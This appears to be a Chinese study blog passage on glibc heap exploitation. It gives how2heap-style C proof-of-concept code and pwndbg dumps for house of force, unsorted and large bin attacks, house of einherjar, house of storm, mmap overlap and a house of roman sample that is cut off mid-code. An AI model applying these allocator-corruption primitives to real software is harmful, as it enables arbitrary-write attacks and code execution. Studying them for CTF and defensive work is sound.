<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b3f0
Size: 0x7e1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555bbd0
Size: 0x3f1
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555bfc0
Size: 0x3f0

Top chunk | PREV_INUSE
Addr: 0x55555555c3b0
Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第三个堆始终没有被操作，而新创建的堆可以堆第三个堆进行读写，形成<code>overlap</code></p>
<p>相关<code>glibc</code>源码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* consolidate forward *&#x2F;
      if (!nextinuse) &#123;
	unlink(av, nextchunk, bck, fwd);
	size +&#x3D; nextsize;
      &#125; else
	clear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放被合并的堆的时候会判断下一个堆即第四个堆是被释放的，因此向下合并到第四个堆</p>
<p>实现效果：存在三个堆，将三个堆合并成一个堆，且可以覆写中间一个堆、中间一个堆始终未被操作</p>
<p>应用：2.31之前的<code>off-by-null</code>：创建三个堆<code>A、B、C</code>通过<code>off-by-bull</code>溢出<code>B</code>到<code>C</code>使得<code>C</code>的低字节被覆盖为<code>0</code>（注意：被覆盖的堆原始大小要在<code>fx</code>，这样创建的堆实际大小就是<code>10x</code>而不会因为修改了第二位导致错误，且<code>A</code>的大小属于<code>unsorted bin</code>）将<code>C</code>的<code>prve_size</code>改成<code>A</code>和<code>B</code>的大小之和，系统将判断<code>A</code>和<code>B</code>是一个堆并且已经被释放，此时释放<code>A</code>和<code>C</code>，从<code>A</code>到<code>C</code>的区域就会合并成一个堆并释放，而<code>B</code>仍然存在。</p>
<h3 id="house-of-force-x2F-top-chunk"><a href="#house-of-force-x2F-top-chunk" class="headerlink" title="house_of_force&#x2F;top chunk"></a>house_of_force&#x2F;top chunk</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;

char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;

int main(int argc , char* argv[])
&#123;
    
	intptr_t *p1 &#x3D; malloc(256);
	int real_size &#x3D; malloc_usable_size(p1);
    
	intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));	
	*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;
	
	unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	
	void *new_ptr &#x3D; malloc(evil_size);
	void* ctr_chunk &#x3D; malloc(100);
	
	strcpy(ctr_chunk, &quot;YEAH!!!&quot;);
    
	assert(ctr_chunk &#x3D;&#x3D; bss_var);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>条件：可以溢出到top_chunk、可以申请任意大小的堆块</p>
<p>首先创建了一个堆，并溢出到<code>top chunk</code>将<code>size</code>改成<code>-1</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x55555555c110
Size: 0xffffffffffffffff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>计算要覆写的地址和<code>top chunk</code>的差并减去<code>chunk header</code>的大小，申请该大小的堆，即把所需地址之前的空间都申请完，因此下一个申请的堆<code>user data</code>处即为要覆写的区域</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk			#申请完所求地址之前的所有空间
Addr: 0x555555558000
Size: 0x555555558008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()&#123;
    
	unsigned long stack_var&#x3D;0;
    
	unsigned long *p&#x3D;malloc(400);
	malloc(500);

	free(p);
    
	p[1]&#x3D;(unsigned long)(&amp;stack_var-2);
    
	malloc(400);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前提：控制unsorted bin的bk指针</p>
<p>目的：实现修改任意地址值为一个较大的数值，但是数值不受控制</p>
<ul>
<li>通过修改循环的次数来使得程序可以执行多次循环</li>
<li>修改global_max_fast 来使得更大的 chunk 可以被视为 fast bin，执行 fast bin attack</li>
</ul>
<p>原理：将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;
          unsorted_chunks (av)-&gt;bk &#x3D; bck;
          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>控制 bk 的值就能将 <code>unsorted_chunks (av)</code> 写到任意地址（要减两个机器字长作为<code>prev_size</code>和<code>size</code>，此时<code>Target Value</code> 处于伪造 <code>chunk</code> 的<code>fd</code>处）</p>
<p><code>victim</code> 的<code>fd</code>在取<code>chunk</code>时并没有发挥作用，所以修改为不合法的值也没有关系，但是<code>unsorted bin </code>链表可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p>
<p>实现：将<code>unsorted bin</code>中的<code>chunk</code>通过溢出修改<code>bk</code>为要修的地址 - 两个机器字节，再分配掉即可将地址内容改成很大的数值</p>
<h3 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main()
&#123;
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	a &#x3D; (uint8_t*) malloc(0x38);
    
	int real_a_size &#x3D; malloc_usable_size(a);
	size_t fake_chunk[6];

	fake_chunk[0] &#x3D; 0x100; 
	fake_chunk[1] &#x3D; 0x100; 
	fake_chunk[2] &#x3D; (size_t) fake_chunk; 
	fake_chunk[3] &#x3D; (size_t) fake_chunk; 
	fake_chunk[4] &#x3D; (size_t) fake_chunk; 
	fake_chunk[5] &#x3D; (size_t) fake_chunk; 

	b &#x3D; (uint8_t*) malloc(0xf8);
	int real_b_size &#x3D; malloc_usable_size(b);

	uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);
    
	a[real_a_size] &#x3D; 0; 
    
	size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
  
	*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;

	fake_chunk[1] &#x3D; fake_size;

	free(b);
    
	d &#x3D; malloc(0x200);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先创建了一个<code>0x30</code>的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x41

Top chunk | PREV_INUSE
Addr: 0x55555555b040
Size: 0x20fc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈上伪造了一个<code>fake chunk</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1c0
0x7fffffffe1c0: 0x0000000000000100      0x0000000000000100	#prev_size, size
0x7fffffffe1d0: 0x00007fffffffe1c0      0x00007fffffffe1c0  #fd, bk
0x7fffffffe1e0: 0x00007fffffffe1c0      0x00007fffffffe1c0	#fd_nextsize, bk_nextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0xf8</code>大小的堆，并通过上一个堆的溢出来将这个堆<code>prve_inuse</code>位改成<code>0</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x41

Allocated chunk
Addr: 0x55555555b040
Size: 0x100

Top chunk | PREV_INUSE
Addr: 0x55555555b140
Size: 0x20ec1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再将<code>prve_size</code>改成该堆与<code>fake chunk</code>的<code>chunk header</code>地址的差</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x55555555b040
0x55555555b040: 0xffffd5555555ce80      0x0000000000000100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>释放该堆再申请回来，此时申请的堆就在<code>fake_chunk</code>处</p>
<pre class="line-numbers language-none"><code class="language-none">Allocated chunk
Addr: 0x7ffffffde010
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在释放一个属于<code>unsorted bin</code>的堆时会检测上一个堆是否被释放，若被释放则向上合并，且下一个堆是<code>top chunk</code>时直接合并到<code>top chunk</code>,所以<code>top chunk</code>地址就在<code>fake chunk</code>处，再次申请堆就可以从<code>fake chunk</code>开始申请</p>
<p>条件：</p>
<ul>
<li>可以篡改<code>prev_size</code> 与 <code>prve_inuse</code> </li>
<li>能够获取到要覆写的地址</li>
<li>能够在要覆写的地址伪造<code>fake chunk</code>，从而绕过 <code>unlink </code>的检测。</li>
</ul>
<h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;assert.h&gt;
 
int main()
&#123;

    unsigned long stack_var1 &#x3D; 0;
    unsigned long stack_var2 &#x3D; 0;

    unsigned long *p1 &#x3D; malloc(0x420);
    malloc(0x20);
    
    unsigned long *p2 &#x3D; malloc(0x500);
    malloc(0x20);

    unsigned long *p3 &#x3D; malloc(0x500);
    malloc(0x20);
 
    free(p1);
    free(p2);
    
    malloc(0x90);
    free(p3);

    p2[-1] &#x3D; 0x3f1;
    p2[0] &#x3D; 0;
    p2[2] &#x3D; 0;
    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);
    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);

    malloc(0x90);
 
    assert(stack_var1 !&#x3D; 0);
    assert(stack_var2 !&#x3D; 0);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>向栈中写入数据，可用于修改<code>global_max_fast</code></li>
</ul>
<p>创建一个<code>large bin</code>之后再创建一个<code>fast bin</code>防止释放的时候合并掉</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405430
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x405460
Size: 0x20ba1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建两个大小相同且与大于第一个大小的<code>large bin</code>且每个<code>large bin</code>下面都创建一个<code>fast bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405430
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x405460
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405970
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x4059a0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405eb0
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x405ee0
Size: 0x20121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第一、二两个堆释放进<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405460 —▸ 0x405000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个比第一个释放的堆小的堆使得<strong>第二个</strong>被释放的堆进入<code>large bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4050a0
smallbins
empty
largebins
0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第三个堆也释放到<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059a0 —▸ 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4059a0
smallbins
empty
largebins
0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改第二个被释放的堆的一些内容</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x405460
0x405460:	0x0000000000000000	0x00000000000003f1			#减小第二个堆的大小使得第三个堆进入large bin链表
0x405470:	0x0000000000000000	0x00007fffffffdd50			#将想要写入的栈地址写入bk、bk_nextsize,其中bk位置的地址要减0x10，bk_nextsize的地址要减0x20
0x405480:	0x0000000000000000	0x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>fast bin</code>使得第三个堆进入<code>unsorted bin</code>，此时栈上的内容也会被修改为第三个堆的头指针</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405140 &#x2F;* &#39;@Q@&#39; *&#x2F;
smallbins
empty
largebins
0x500 [corrupted]
FD: 0x405460 ◂— 0x0
BK: 0x405460 —▸ 0x4059a0 —▸ 0x7fffffffdd50 ◂— 0x4059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;gx 0x7fffffffdd60
0x7fffffffdd60:	0x00000000004059a0
pwndbg&gt; x&#x2F;gx 0x7fffffffdd68
0x7fffffffdd68:	0x00000000004059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char filler[0x10];
char target[0x60]; 

void init()&#123;
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
&#125;

int get_shift_amount(char* pointer)&#123;

        int shift_amount &#x3D; 0;
        long long ptr &#x3D; (long long)pointer;

        while(ptr &gt; 0x20)&#123;
                ptr &#x3D; ptr &gt;&gt; 8;
                shift_amount +&#x3D; 1;
        &#125;

        return shift_amount - 1; 
&#125;

int main()&#123;

	init();

	char *unsorted_bin, *large_bin, *fake_chunk, *ptr;

	unsorted_bin &#x3D; malloc ( 0x4e8 ); 

	malloc ( 0x18 ); 

	int shift_amount &#x3D; get_shift_amount(unsorted_bin);
        printf(&quot;Shift Amount: %d\n&quot;, shift_amount);

        size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);
        if(alloc_size &lt; 0x10)&#123;
                printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);
                puts(&quot;Chunk size is too small&quot;);
                exit(1);
        &#125;
        alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10; 
        printf(&quot;In this case, the chunk size is 0x%lx\n&quot;, alloc_size);

        if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;
                puts(&quot;Allocation size has bit 4 of the size set or &quot;);
                puts(&quot;mmap and non-main arena bit check will fail&quot;);
                puts(&quot;Please try again! :)&quot;);
                puts(&quot;Exiting...&quot;);
                return 1;

	&#125;

	large_bin  &#x3D;  malloc ( 0x4d8 ); 
	malloc ( 0x18 );

	free ( large_bin );  
	free ( unsorted_bin );

	unsorted_bin &#x3D; malloc(0x4e8);
	free(unsorted_bin);

	fake_chunk &#x3D; target - 0x10;

	((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; 

	(( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ;
	
	ptr &#x3D; malloc(alloc_size);
	strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);
	
	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>条件：没有地址随机化</p>
<p>首先创建一个<code>unsorted bin</code>和一个<code>large bin</code>（<code>large bin</code>小于<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x4f1

Allocated chunk | PREV_INUSE
Addr: 0x405780
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x4057a0
Size: 0x4e1

Allocated chunk | PREV_INUSE
Addr: 0x405c80
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405ca0
Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放<code>large bin</code>和<code>unsroted bin</code>，再创建一个堆并释放掉使得<code>large bin</code>能够真正进入<code>large bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x291

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405290
Size: 0x4f1
fd: 0x7ffff7facbe0
bk: 0x7ffff7facbe0

Allocated chunk
Addr: 0x405780
Size: 0x20

Free chunk (largebins) | PREV_INUSE
Addr: 0x4057a0
Size: 0x4e1
fd: 0x7ffff7fad000
bk: 0x7ffff7fad000
fd_nextsize: 0x4057a0
bk_nextsize: 0x4057a0

Allocated chunk
Addr: 0x405c80
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x405ca0
Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>unsorted bin</code>的<code>bk</code>改成<code>目标地址 - 0x10</code></p>
<p>将<code>large bin</code>的<code>bk_nextsize</code>改成<code>目标地址 - 0x28 - shift amount</code>，<code>bk</code>改成<code>目标地址 - 0x8</code></p>
<p>其中，<code>shift amount</code>计算方式：<code>large bin</code>地址转换为长长整型，每次右移<code>8</code>位知道小于等于<code>0x20</code>，<code>shift amount</code>即为右移次数减<code>1</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x291

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405290
Size: 0x4f1
fd: 0x7ffff7facbe0
bk: 0x404070

Allocated chunk
Addr: 0x405780
Size: 0x20

Free chunk (largebins) | PREV_INUSE
Addr: 0x4057a0
Size: 0x4e1
fd: 0x7ffff7fad000
bk: 0x404078
fd_nextsize: 0x4057a0
bk_nextsize: 0x404056

Allocated chunk
Addr: 0x405c80
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x405ca0
Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再申请出来就可以将目标地址改成一个随机的很大的数字了</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x404080
0x404080 &lt;target&gt;:	0x0047464544434241	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="mmap-overlapping-chunks-x2F-mmap"><a href="#mmap-overlapping-chunks-x2F-mmap" class="headerlink" title="mmap_overlapping_chunks&#x2F;mmap"></a>mmap_overlapping_chunks&#x2F;mmap</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;

int main()&#123;


	int* ptr1 &#x3D; malloc(0x10); 

	long long* top_ptr &#x3D; malloc(0x100000);
	long long* mmap_chunk_2 &#x3D; malloc(0x100000);
	long long* mmap_chunk_3 &#x3D; malloc(0x100000);
    
	mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;
    
	free(mmap_chunk_3); 

	long long* overlapping_chunk &#x3D; malloc(0x300000);
    
	int distance &#x3D; mmap_chunk_2 - overlapping_chunk;
    
	overlapping_chunk[distance] &#x3D; 0x1122334455667788;

	assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对<code>mmap</code>的<code>overlap</code>，原理与<code>overlapping_chunks</code>相同，只是堆的大小在<code>mmap</code>创建的范围</p>
<p>首先创建了一个<code>0x10</code>的堆和三个<code>0x100000</code>的堆I（<code>heap</code>里看不到</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x405020
Size: 0x411

Top chunk | PREV_INUSE
Addr: 0x405430
Size: 0x20bd1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">The first mmap chunk goes directly above LibC: 0x7ffff7ef2010
The second mmap chunk goes below LibC: 0x7ffff790c010
The third mmap chunk goes below the second mmap chunk: 0x7ffff780b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到第三个堆地址在第二个之上，所以将第三个堆大小改成二、三两个堆大小之和</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff780b000
0x7ffff780b000:	0x0000000000000000	0x0000000000202002
0x7ffff780b010:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>释放这个堆之后再申请出来(<code>0x300000</code>)</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff770c000
0x7ffff770c000:	0x0000000000000000	0x0000000000301002
0x7ffff770c010:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>则第二个堆可用且第三个堆中第二个堆的部分也可用</p>
<h3 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE    
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;malloc.h&gt;
#include &lt;dlfcn.h&gt;

char* shell &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;;

void* init()&#123;
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
&#125;


int main()&#123;

	init();

	uint8_t* fastbin_victim &#x3D; malloc(0x60); 

	malloc(0x80);

	uint8_t* main_arena_use &#x3D; malloc(0x80);
	
	uint8_t* relative_offset_heap &#x3D; malloc(0x60);
	
	free(main_arena_use);
	
	uint8_t* fake_libc_chunk &#x3D; malloc(0x60);

	long long __malloc_hook &#x3D; ((long*)fake_libc_chunk)[0] - 0xe8;

	free(relative_offset_heap);	
	free(fastbin_victim);

	fastbin_victim[0] &#x3D; 0x00; 
    
	long long __malloc_hook_adjust &#x3D; __malloc_hook - 0x23; 
    
	int8_t byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; 	
	int8_t byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; 
	fake_libc_chunk[0] &#x3D; byte1;
	fake_libc_chunk[1] &#x3D; byte2; 
    
	malloc(0x60);
	malloc(0x60);

	uint8_t* malloc_hook_chunk &#x3D; malloc(0x60);	

